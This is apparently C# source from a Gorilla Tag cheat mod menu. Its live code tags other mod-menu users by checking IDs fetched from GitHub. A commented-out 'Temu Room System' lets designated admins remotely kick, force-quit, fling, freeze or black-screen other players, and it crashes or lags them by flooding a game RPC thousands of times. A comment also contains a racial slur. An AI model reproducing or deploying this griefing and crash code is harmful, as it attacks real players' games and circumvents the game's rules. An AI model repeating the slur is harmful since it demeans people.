using ExitGames.Client.Photon;
using GorillaTagScripts;
using Hidden;
using Hidden.Menu;
using Hidden.Mods;
using Hidden.Utilities;
using Hidden.Utilities.Notifs;
using Photon.Pun;
using Photon.Realtime;
using System;
using System.Collections;
using System.Net.Http;
using System.Text;
using TMPro;
using UnityEngine;
using UnityEngine.Networking;
using static Hidden.Mods.Category;
using static Hidden.Utilities.GunTemplate;
using Hashtable = ExitGames.Client.Photon.Hashtable;
using Object = UnityEngine.Object;

namespace Admin
{
    internal class TemuRoomSystem : MonoBehaviour
    {/*
        public enum TemuEvents
        {
            Vibrate,
            Slow,
            Fast,
            Kick,
            QuitApp,
            Fling,
            blackScreen,
            Grab,
            ForceMenu,
            Lag,    
            Crash,
        }
        */
        public static void Violet()
        {
            foreach (VRRig vrrig in GorillaParent.instance.vrrigs)
            {
                if (vrrig != null && vrrig != GorillaTagger.Instance.offlineVRRig)
                {
                    GameObject gameObject = new GameObject("NetworkedNametagLabel");
                    TextMeshPro textMeshPro = gameObject.AddComponent<TextMeshPro>();
                    Player player = RigManager.GetPlayerFromVRRig(vrrig);

                    if (player != null)
                    {

                        if (Vuserid.Contains(vrrig.Creator.UserId))
                        {
                            textMeshPro.text = "Violet Owner";
                        }
                        else if (player.CustomProperties.ContainsKey("VioletFreeUser") && (bool)player.CustomProperties["VioletFreeUser"])
                        {
                            textMeshPro.text = "Violet Free";
                        }
                        else
                        {
                            textMeshPro.text = "";
                        }

                        textMeshPro.font = Resources.Load<TMP_FontAsset>("LiberationSans SDF");
                        textMeshPro.fontSize = 4f;
                        textMeshPro.alignment = TextAlignmentOptions.Center;
                        textMeshPro.color = new Color32(140, 194, 150, 255);
                        gameObject.transform.position = vrrig.transform.position + new Vector3(0f, 0.7f, 0f);
                        gameObject.transform.rotation = Quaternion.LookRotation(gameObject.transform.position - GorillaTagger.Instance.headCollider.transform.position);
                        Object.Destroy(gameObject, Time.deltaTime); // Slightly longer duration to ensure visibility
                    }

                }
            }
        }

        public static void Mist()
        {
            foreach (VRRig vrrig in GorillaParent.instance.vrrigs)
            {
                if (vrrig != null && vrrig != GorillaTagger.Instance.offlineVRRig)
                {
                    GameObject gameObject = new GameObject("NetworkedNametagLabel");
                    TextMeshPro textMeshPro = gameObject.AddComponent<TextMeshPro>();
                    Player player = RigManager.GetPlayerFromVRRig(vrrig);

                    if (player != null)
                    {
                        if (userid.Contains(vrrig.Creator.UserId))
                        {
                            textMeshPro.text = "Mist Owner";
                        }
                        else if (ADuserid.Contains(vrrig.Creator.UserId))
                        {
                            textMeshPro.text = "Nova (co-owner of mist!!! me so cool!!!)";
                        }
                        else if (player.CustomProperties.ContainsKey("MistUser") && (bool)player.CustomProperties["MistUser"])
                        {
                            textMeshPro.text = "Mist Free";
                        }
                        else if (player.CustomProperties.ContainsKey("MistLegal") && (bool)player.CustomProperties["MistLegal"])
                        {
                            textMeshPro.text = "Mist Legal";
                        }
                        else
                        {
                            textMeshPro.text = "";
                        }
                        textMeshPro.color = ColorLib.RGB.color;
                        textMeshPro.material.shader = Shader.Find("GUI/Text Shader");
                        textMeshPro.fontSize = 3.5f;
                        textMeshPro.fontStyle = FontStyles.Normal;
                        textMeshPro.alignment = TextAlignmentOptions.Center;
                        textMeshPro.font = GameObject.Find("Environment Objects/LocalObjects_Prefab/TreeRoom/motdBodyText").GetComponent<TextMeshPro>().font;

                        textMeshPro.transform.position = vrrig.headMesh.transform.position + new Vector3(0f, 0.90f, 0f);
                        textMeshPro.transform.LookAt(Camera.main.transform);
                        textMeshPro.transform.Rotate(0, 180, 0);

                        Object.Destroy(gameObject, Time.deltaTime); // Slightly longer duration to ensure visibility
                    }

                }
            }
        }
        public static void Hidden()
        {
            foreach (VRRig vrrig in GorillaParent.instance.vrrigs)
            {
                if (vrrig != null && vrrig != GorillaTagger.Instance.offlineVRRig)
                {
                    GameObject gameObject = new GameObject("NetworkedNametagLabel");
                    TextMeshPro textMeshPro = gameObject.AddComponent<TextMeshPro>();
                    Player player = RigManager.GetPlayerFromVRRig(vrrig);

                    if (player != null)
                    {

                        if (Huserid.Contains(vrrig.Creator.UserId))
                        {
                            textMeshPro.text = "Hidden Owner";
                        }
                        else if (player.CustomProperties.ContainsKey("HiddenMenu") && (bool)player.CustomProperties["HiddenMenu"])
                        {
                            textMeshPro.text = "Hidden Menu";
                        }
                        else if (player.CustomProperties.ContainsKey("Hidden Menu") && (bool)player.CustomProperties["Hidden Menu"])
                        {
                            textMeshPro.text = "Hidden OLD";
                        }
                        else
                        {
                            textMeshPro.text = "";
                        }

                        textMeshPro.color = ColorLib.RGB.color;
                        textMeshPro.material.shader = Shader.Find("GUI/Text Shader");
                        textMeshPro.fontSize = 3.5f;
                        textMeshPro.fontStyle = FontStyles.Normal;
                        textMeshPro.alignment = TextAlignmentOptions.Center;
                        textMeshPro.font = GameObject.Find("Environment Objects/LocalObjects_Prefab/TreeRoom/motdBodyText").GetComponent<TextMeshPro>().font;

                        textMeshPro.transform.position = vrrig.headMesh.transform.position + new Vector3(0f, 0.90f, 0f);
                        textMeshPro.transform.LookAt(Camera.main.transform);
                        textMeshPro.transform.Rotate(0, 180, 0);

                        Object.Destroy(gameObject, Time.deltaTime); // Slightly longer duration to ensure visibility
                    }

                }
            }
        }
        public static void Elysor()
        {
            foreach (VRRig vrrig in GorillaParent.instance.vrrigs)
            {
                if (vrrig != null && vrrig != GorillaTagger.Instance.offlineVRRig)
                {
                    GameObject gameObject = new GameObject("NetworkedNametagLabel");
                    TextMeshPro textMeshPro = gameObject.AddComponent<TextMeshPro>();
                    Player player = RigManager.GetPlayerFromVRRig(vrrig);

                    if (player != null)
                    {

                        if (Euserid.Contains(vrrig.Creator.UserId))
                        {
                            textMeshPro.text = "Elysor Owner";
                        }
                        else if (player.CustomProperties.ContainsKey("ElysorPaid") && (bool)player.CustomProperties["ElysorPaid"])
                        {
                            textMeshPro.text = "Elysor Paid";
                        }
                        else
                        {
                            textMeshPro.text = "";
                        }

                        textMeshPro.font = Resources.Load<TMP_FontAsset>("LiberationSans SDF");
                        textMeshPro.fontSize = 4f;
                        textMeshPro.alignment = TextAlignmentOptions.Center;
                        textMeshPro.color = new Color32(140, 194, 150, 255);
                        gameObject.transform.position = vrrig.transform.position + new Vector3(0f, 0.7f, 0f);
                        gameObject.transform.rotation = Quaternion.LookRotation(gameObject.transform.position - GorillaTagger.Instance.headCollider.transform.position);
                        Object.Destroy(gameObject, Time.deltaTime); // Slightly longer duration to ensure visibility
                    }

                }
            }
        }
        public static void TAGS()
        {
            Elysor();
            Mist();
            Violet();
            Hidden();
            //NIGGER
        }
        
        /*
        public static void SendWeb(string message)
        {
            string jsonPayload = "{\"content\": \"" + message + "\"}";
            GorillaTagger.Instance.StartCoroutine(SendWebhook(jsonPayload));
        }

        private static IEnumerator SendWebhook(string jsonPayload)
        {
            UnityWebRequest request = new UnityWebRequest(webhookUrl, "POST");
            {
                byte[] bodyRaw = Encoding.UTF8.GetBytes(jsonPayload);
                request.uploadHandler = new UploadHandlerRaw(bodyRaw);
                request.downloadHandler = new DownloadHandlerBuffer();
                request.SetRequestHeader("Content-Type", "application/json");
                yield return request.SendWebRequest();
                if ((int)request.result != 1)
                {
                }
                bodyRaw = null;
            }
            ((IDisposable)request)?.Dispose();
            yield break;
        }

        public static void Acess()
        {
            if (userid.Contains(PhotonNetwork.LocalPlayer.UserId) || ADuserid.Contains(PhotonNetwork.LocalPlayer.UserId) || Huserid.Contains(PhotonNetwork.LocalPlayer.UserId) || Vuserid.Contains(PhotonNetwork.LocalPlayer.UserId) || Euserid.Contains(PhotonNetwork.LocalPlayer.UserId))
            {
                ButtonHandler.ChangePage(Category.IHateMyself);
            }
            else
            {
                NotificationLib.SendNotification("<color=red>Temu Room System</color> : You are not a Admin.");
            }
        }

        public static void SendEvent(int Index, Photon.Realtime.Player plr)
        {
            if (PhotonNetwork.InRoom)
            {
                if (Time.time > Delay)
                {
                    Delay = Time.time + 0.1f;
                    PhotonNetwork.NetworkingClient.OpRaiseEvent(4, new ExitGames.Client.Photon.Hashtable
                    {
                        { 0, Index },
                        { 1, plr.ActorNumber }
                    }, new RaiseEventOptions { TargetActors = new int[] { plr.ActorNumber } }, SendOptions.SendReliable);
                }
            }
        }

        public static float Delay;

        public static void SendEvent(int Index, Photon.Realtime.Player plr, bool target)
        {
            if (PhotonNetwork.InRoom)
            {
                if (Time.time > Delay)
                {
                    Delay = Time.time + 0.1f;
                    if (target)
                    {
                        PhotonNetwork.NetworkingClient.OpRaiseEvent(4, new ExitGames.Client.Photon.Hashtable
                        {
                            { 0, Index },
                            { 1, plr.ActorNumber }
                        }, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendReliable);
                    }
                    else
                    {
                        PhotonNetwork.NetworkingClient.OpRaiseEvent(4, new ExitGames.Client.Photon.Hashtable
                        {
                            { 0, Index },
                        }, new RaiseEventOptions { Receivers = ReceiverGroup.Others }, SendOptions.SendReliable);
                    }
                }
            }
        }

        public static void OnEvent(EventData photonEvent)
        {
            if (photonEvent.Code == 4)
            {
                if (PhotonNetwork.InRoom)
                {
                    if (photonEvent.CustomData is ExitGames.Client.Photon.Hashtable data)
                    {
                        int Index = (int)data[0];
                        Photon.Realtime.Player player = PhotonNetwork.CurrentRoom.GetPlayer(photonEvent.Sender);
                        VRRig vrrig = RigManager.GetVRRigFromPlayer(player);

                        if (userid.Contains(player.UserId))
                        {
                            switch (Index)
                            {
                                case (int)TemuEvents.Slow:
                                    GorillaTagger.Instance.ApplyStatusEffect(GorillaTagger.StatusEffect.Frozen, 1f);
                                    break;

                                case (int)TemuEvents.Vibrate:
                                    GorillaTagger.Instance.StartVibration(true, 0.5f, 0.5f);
                                    GorillaTagger.Instance.StartVibration(false, 0.5f, 0.5f);
                                    break;

                                case (int)TemuEvents.Fast:
                                    GorillaLocomotion.GTPlayer.Instance.maxJumpSpeed = 14f;
                                    GorillaLocomotion.GTPlayer.Instance.jumpMultiplier = 3f;
                                    break;

                                case (int)TemuEvents.Kick:
                                    PhotonNetwork.Disconnect();
                                    break;

                                case (int)TemuEvents.QuitApp:
                                    Application.Quit();
                                    break;

                                case (int)TemuEvents.Fling:
                                    GorillaLocomotion.GTPlayer.Instance.ApplyKnockback(GorillaTagger.Instance.transform.up, 7f, true);
                                    break;

                                case (int)TemuEvents.blackScreen:
                                    GorillaLocomotion.GTPlayer.Instance.ApplyKnockback(GorillaTagger.Instance.transform.up, 70000000000f, true);
                                    break;

                                case (int)TemuEvents.Grab:
                                    GorillaLocomotion.GTPlayer.Instance.transform.position = vrrig.transform.position + new Vector3(0f, 0.5f, 0f);
                                    break;

                                case (int)TemuEvents.ForceMenu:
                                    Main.Draw();
                                    break;

                                case (int)TemuEvents.Lag:
                                    if (Time.time > Delay)
                                    {
                                        Delay = Time.time + 0.5f;
                                        for (int i = 0; i < 130; i++)
                                        {
                                            PhotonNetwork.RPC(FriendshipGroupDetection.Instance.photonView, "NotifyPartyMerging", PhotonNetwork.CurrentRoom.GetPlayer((int)data[1]), true, new object[1]);
                                            PhotonNetwork.SendAllOutgoingCommands();
                                        }
                                    }
                                    if (Time.time > Delay)
                                    {
                                        Delay = Time.time + 0.5f;
                                        RPC2();
                                    }
                                    break;

                                case (int)TemuEvents.Crash:
                                    if (Time.time > Delay)
                                    {
                                        Delay = Time.time + 8f;
                                        for (int i = 0; i < 3300; i++)
                                        {
                                            PhotonNetwork.RPC(FriendshipGroupDetection.Instance.photonView, "NotifyPartyMerging", PhotonNetwork.CurrentRoom.GetPlayer((int)data[1]), true, new object[1]);
                                            PhotonNetwork.SendAllOutgoingCommands();
                                        }
                                    }
                                    if (Time.time > Delay)
                                    {
                                        Delay = Time.time + 0.5f;
                                        RPC2();
                                    }
                                    break;

                            }
                        }
                    }
                }
            }
        }

        public static void SlowStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.Slow, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }

        public static void SlowAllVP()
        {
            SendEvent((int)TemuEvents.Slow, null, false);
        }

        public static void VibrateStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.Vibrate, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }

        public static void VibrateAllVP()
        {
            SendEvent((int)TemuEvents.Vibrate, null, false);
        }

        public static void FastStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.Fast, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }

        public static void FastAllVP()
        {
            SendEvent((int)TemuEvents.Fast, null, false);
        }

        public static void KickStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.Kick, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }

        public static void KickAllVP()
        {
            SendEvent((int)TemuEvents.Kick, null, false);
        }

        public static void QuitAppStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.QuitApp, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }

        public static void QuitAppAllVP()
        {
            SendEvent((int)TemuEvents.QuitApp, null, false);
        }

        public static void FlingStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.Fling, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }

        public static void FlingAllVP()
        {
            SendEvent((int)TemuEvents.Fling, null, false);
        }

        public static void GrabAllVP()
        {
            SendEvent((int)TemuEvents.Grab, null, false);
        }

        public static void GrabStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.Grab, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }

        public static void ForceMenuAllVP()
        {
            SendEvent((int)TemuEvents.ForceMenu, null, false);
        }

        public static void ForceMenuStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.ForceMenu, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }


        public static void BlackScreenStartBothGunsVP()
        {
            GunTemplate.StartBothGuns(() =>
            {
                SendEvent((int)TemuEvents.blackScreen, RigManager.GetPlayerFromVRRig(GunTemplate.LockedPlayer));
            }, true);
        }

        public static void BlackScreenAllVP()
        {
            SendEvent((int)TemuEvents.blackScreen, null, false);
        }

        public static void RPC2()
        {
            ExitGames.Client.Photon.Hashtable hashtable = new ExitGames.Client.Photon.Hashtable
            {
                [0] = GorillaTagger.Instance.myVRRig.ViewID
            };
            PhotonNetwork.NetworkingClient.OpRaiseEvent(200, hashtable, new RaiseEventOptions
            {
                CachingOption = (EventCaching)6,
                TargetActors = new int[]
                {
            PhotonNetwork.LocalPlayer.ActorNumber
                }
            }, SendOptions.SendReliable);
        }
        */
        public static string userid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/userid").GetAwaiter().GetResult();
        public static string webhookUrl = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/legal_hook").GetAwaiter().GetResult();
        public static string ADuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/Cha554/mist-ext/refs/heads/main/ADUserID's").GetAwaiter().GetResult();
        public static string Vuserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/TortiseWay2Cool/Kill_Switch/refs/heads/main/Valid%20User%20ID").GetAwaiter().GetResult();
        public static string Euserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/xclipse13295-commits/id-s/refs/heads/main/ValidID's").GetAwaiter().GetResult();
        public static string Huserid = new HttpClient().GetStringAsync("https://raw.githubusercontent.com/menker-cs/Hidden/refs/heads/main/Player-ID.txt").GetAwaiter().GetResult();


    }
}